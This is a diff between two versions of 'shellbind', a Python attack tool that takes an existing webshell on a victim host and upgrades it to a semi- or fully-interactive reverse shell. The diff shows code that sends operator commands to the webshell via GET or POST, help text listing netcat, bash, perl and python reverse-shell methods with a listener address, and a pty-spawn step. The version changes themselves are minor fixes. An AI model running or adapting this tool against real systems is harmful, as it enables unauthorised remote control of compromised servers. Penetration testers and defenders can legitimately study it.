# Comparing `tmp/shellbind-1.0.tar.gz` & `tmp/shellbind-1.0.1.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "shellbind-1.0.tar", last modified: Sun Jun 18 21:46:40 2023, max compression
+gzip compressed data, was "shellbind-1.0.1.tar", last modified: Tue Jul  4 19:08:44 2023, max compression
```

## Comparing `shellbind-1.0.tar` & `shellbind-1.0.1.tar`

### file list

```diff
@@ -1,13 +1,13 @@
-drwxr-xr-x   0 sol       (1000) sol       (1000)        0 2023-06-18 21:46:40.523808 shellbind-1.0/
--rw-r--r--   0 sol       (1000) sol       (1000)    35149 2023-06-18 20:10:21.000000 shellbind-1.0/LICENSE
--rw-r--r--   0 sol       (1000) sol       (1000)     2255 2023-06-18 21:46:40.523808 shellbind-1.0/PKG-INFO
--rw-r--r--   0 sol       (1000) sol       (1000)     2018 2023-06-18 20:28:58.000000 shellbind-1.0/README.md
--rw-r--r--   0 sol       (1000) sol       (1000)       38 2023-06-18 21:46:40.523808 shellbind-1.0/setup.cfg
--rw-r--r--   0 sol       (1000) sol       (1000)      504 2023-06-18 21:45:59.000000 shellbind-1.0/setup.py
-drwxr-xr-x   0 sol       (1000) sol       (1000)        0 2023-06-18 21:46:40.523808 shellbind-1.0/shellbind.egg-info/
--rw-r--r--   0 sol       (1000) sol       (1000)     2255 2023-06-18 21:46:40.000000 shellbind-1.0/shellbind.egg-info/PKG-INFO
--rw-r--r--   0 sol       (1000) sol       (1000)      203 2023-06-18 21:46:40.000000 shellbind-1.0/shellbind.egg-info/SOURCES.txt
--rw-r--r--   0 sol       (1000) sol       (1000)        1 2023-06-18 21:46:40.000000 shellbind-1.0/shellbind.egg-info/dependency_links.txt
--rw-r--r--   0 sol       (1000) sol       (1000)       30 2023-06-18 21:46:40.000000 shellbind-1.0/shellbind.egg-info/requires.txt
--rw-r--r--   0 sol       (1000) sol       (1000)       10 2023-06-18 21:46:40.000000 shellbind-1.0/shellbind.egg-info/top_level.txt
--rwxr-xr-x   0 sol       (1000) sol       (1000)     6845 2023-06-18 20:04:27.000000 shellbind-1.0/shellbind.py
+drwxr-xr-x   0 sol       (1000) sol       (1000)        0 2023-07-04 19:08:44.701949 shellbind-1.0.1/
+-rw-r--r--   0 sol       (1000) sol       (1000)    35149 2023-06-18 20:10:21.000000 shellbind-1.0.1/LICENSE
+-rw-r--r--   0 sol       (1000) sol       (1000)     2301 2023-07-04 19:08:44.701949 shellbind-1.0.1/PKG-INFO
+-rw-r--r--   0 sol       (1000) sol       (1000)     2062 2023-06-18 21:57:20.000000 shellbind-1.0.1/README.md
+-rw-r--r--   0 sol       (1000) sol       (1000)       38 2023-07-04 19:08:44.701949 shellbind-1.0.1/setup.cfg
+-rw-r--r--   0 sol       (1000) sol       (1000)      506 2023-07-04 19:05:41.000000 shellbind-1.0.1/setup.py
+drwxr-xr-x   0 sol       (1000) sol       (1000)        0 2023-07-04 19:08:44.701949 shellbind-1.0.1/shellbind.egg-info/
+-rw-r--r--   0 sol       (1000) sol       (1000)     2301 2023-07-04 19:08:44.000000 shellbind-1.0.1/shellbind.egg-info/PKG-INFO
+-rw-r--r--   0 sol       (1000) sol       (1000)      203 2023-07-04 19:08:44.000000 shellbind-1.0.1/shellbind.egg-info/SOURCES.txt
+-rw-r--r--   0 sol       (1000) sol       (1000)        1 2023-07-04 19:08:44.000000 shellbind-1.0.1/shellbind.egg-info/dependency_links.txt
+-rw-r--r--   0 sol       (1000) sol       (1000)       30 2023-07-04 19:08:44.000000 shellbind-1.0.1/shellbind.egg-info/requires.txt
+-rw-r--r--   0 sol       (1000) sol       (1000)       10 2023-07-04 19:08:44.000000 shellbind-1.0.1/shellbind.egg-info/top_level.txt
+-rwxr-xr-x   0 sol       (1000) sol       (1000)     6880 2023-07-04 19:03:21.000000 shellbind-1.0.1/shellbind.py
```

### Comparing `shellbind-1.0/LICENSE` & `shellbind-1.0.1/LICENSE`

 * *Files identical despite different names*

### Comparing `shellbind-1.0/PKG-INFO` & `shellbind-1.0.1/PKG-INFO`

 * *Files 4% similar despite different names*

```diff
@@ -1,23 +1,27 @@
 Metadata-Version: 2.1
 Name: shellbind
-Version: 1.0
+Version: 1.0.1
 Summary: Shellbinding to Webshell
 Home-page: https://github.com/hydr0nium/shellbind
 Author: Hydr0nium/Sol
 License: GPL-3.0
 Description-Content-Type: text/markdown
 License-File: LICENSE
 
 # shellbind
 
 Shellbind is a python script that allows to bind a semi- or fully-interactive shell to an existing crude webshell.
 
 ### Installation:
+```bash
+pip install shellbind
+```
 
+### Usage
 ```bash
 usage: shellbind.py [-h] -p PARAMETER NAME [-X METHOD] -u HOST [-v] [-r METHOD:LHOST:PORT]
 
 Shellbind is a programm that helps to upgrade a simple GET/POST webshell into a semi- or fully-interactive (reverse) shell.
 
 options:
   -h, --help            show this help message and exit
```

### Comparing `shellbind-1.0/README.md` & `shellbind-1.0.1/README.md`

 * *Files 3% similar despite different names*

```diff
@@ -1,13 +1,17 @@
 # shellbind
 
 Shellbind is a python script that allows to bind a semi- or fully-interactive shell to an existing crude webshell.
 
 ### Installation:
+```bash
+pip install shellbind
+```
 
+### Usage
 ```bash
 usage: shellbind.py [-h] -p PARAMETER NAME [-X METHOD] -u HOST [-v] [-r METHOD:LHOST:PORT]
 
 Shellbind is a programm that helps to upgrade a simple GET/POST webshell into a semi- or fully-interactive (reverse) shell.
 
 options:
   -h, --help            show this help message and exit
```

### Comparing `shellbind-1.0/shellbind.egg-info/PKG-INFO` & `shellbind-1.0.1/shellbind.egg-info/PKG-INFO`

 * *Files 4% similar despite different names*

```diff
@@ -1,23 +1,27 @@
 Metadata-Version: 2.1
 Name: shellbind
-Version: 1.0
+Version: 1.0.1
 Summary: Shellbinding to Webshell
 Home-page: https://github.com/hydr0nium/shellbind
 Author: Hydr0nium/Sol
 License: GPL-3.0
 Description-Content-Type: text/markdown
 License-File: LICENSE
 
 # shellbind
 
 Shellbind is a python script that allows to bind a semi- or fully-interactive shell to an existing crude webshell.
 
 ### Installation:
+```bash
+pip install shellbind
+```
 
+### Usage
 ```bash
 usage: shellbind.py [-h] -p PARAMETER NAME [-X METHOD] -u HOST [-v] [-r METHOD:LHOST:PORT]
 
 Shellbind is a programm that helps to upgrade a simple GET/POST webshell into a semi- or fully-interactive (reverse) shell.
 
 options:
   -h, --help            show this help message and exit
```

### Comparing `shellbind-1.0/shellbind.py` & `shellbind-1.0.1/shellbind.py`

 * *Files 5% similar despite different names*

```diff
@@ -10,24 +10,24 @@
 import os
 import multiprocessing
 
 # Parse Command Line Arguments
 parser = argparse.ArgumentParser(description="Shellbind is a programm that helps to upgrade a simple GET/POST webshell into a semi- or fully-interactive (reverse) shell.", epilog="Examples:\n-Semi interactive shell (no cd, su, etc.)\n\tshellbind.py -X POST -p cmd -u http://vuln.example/shell.php\n-Fully interactive shell with verbose output\n\tshellbind.py -p cmd -u http://vuln.example/shell.py -v -r auto:10.10.13.37:8080", formatter_class=argparse.RawTextHelpFormatter)
 
 parser.add_argument("-p", "--parameter", metavar="PARAMETER NAME", dest="para_name", help="The parameter the is used to run shell commands", required=True, nargs=1)
-parser.add_argument("-X" , "--method", metavar="METHOD", dest="method", help="The method (GET/POST) that that is used (Default: GET)", default="GET", nargs=1)
+parser.add_argument("-X" , "--method", metavar="METHOD", dest="method", help="The method (GET/POST) that that is used (Default: GET)", default=["GET"], nargs=1)
 parser.add_argument("-u", "--host", dest="host", metavar="HOST", help="The host that is attacked.\nExample: http://www.victim.com/vuln.php", required=True, nargs=1)
 parser.add_argument("-v", "--verbose", dest="debug", help="Verbose Output", action='store_true', default=False)
 parser.add_argument("-r", "--reverse", dest="reverse", help="If set the programm upgrades the connection from a webshell to a fully-interactive reverse shell.\nAvailable methods are:\n  auto - Try until a reverse shell binds\n  php - php reverseshell\n  py - python3 reverse shell with sockets\n  py2 - python2 reverse shell with sockets\n  nc1 - netcat reverse shell with -e flag\n  nc2 - netcat reverse shell with -c flag\n  bash - sh -i reverse shell\n  perl - perl reverse shell\nLHOST should be the ip that the victim can connect to\nThe port can be any unused port", metavar="METHOD:LHOST:PORT", nargs=1)
 args = parser.parse_args()
 
 # Initilized listener and start trying reverse shell payloads
 def init_upgraded_shell():
-    args.method = args.method.upper()
-    if args.method not in ["GET", "POST"]:
+    args.method[0] = args.method[0].upper()
+    if args.method[0] not in ["GET", "POST"]:
         print(f"[!] Method {args.method} not recognized")
         sys.exit()
     try:
         payload_method, ip, port = args.reverse[0].split(":")
         port = int(port)
         # Payloads from revshells.com
         payloads = {
@@ -55,32 +55,32 @@
     time.sleep(1)
     timeout = 1
     if payload_method == 'auto':
         for payload in payloads.values():
             try:
                 if args.debug:
                     print(f"[!] Trying: {payload}") 
-                if args.method == "GET":
+                if args.method[0] == "GET":
                     params = {args.para_name[0]: payload}
                     requests.get(args.host[0], params=params, timeout=timeout)
-                elif args.method == "POST":
+                elif args.method[0] == "POST":
                     params = {args.para_name[0]: payload}
                     requests.post(args.host[0], data=params, timeout=timeout)
                 time.sleep(1)
             except:
                 pass
     else:
         payload = payloads[payload_method]
         try:
             if args.debug:
                 print(f"[!] Trying: {payload}") 
-            if args.method == "GET":
+            if args.method[0] == "GET":
                 params = {args.para_name[0]: payload}
                 requests.get(args.host[0], params=params, timeout=timeout)
-            elif args.method == "POST":
+            elif args.method[0] == "POST":
                 params = {args.para_name[0]: payload}
                 requests.post(args.host[0], data=params, timeout=timeout)
             time.sleep(1)
         except:
             pass
         print(f"[!] Method {payload_method} was not successfull")
 
@@ -103,24 +103,24 @@
     nc.send('''python3 -c "import pty;pty.spawn('/bin/bash')"\n''')
     time.sleep(1)
     nc.send("reset\n")
     nc.interactive()
     
 
 def web_shell():
-    args.method = args.method.upper()
-    if args.method not in ["GET", "POST"]:
+    args.method[0] = args.method[0].upper()
+    if args.method[0] not in ["GET", "POST"]:
         print(f"[!] Method {args.method} not recognized")
         sys.exit()
     if args.debug:
         print("[!] Shellbind is ready. You can run commands now")
     while True:
         try:
             command = input("$ ")
-            if args.method == "GET":
+            if args.method[0] == "GET":
                 params = {args.para_name[0]: command}
                 res = requests.get(args.host[0], params=params)
             else:
                 params = {args.para_name[0]: command}
                 res = requests.post(args.host[0], data=params)
             print(res.text)
         except requests.ConnectionError:
```

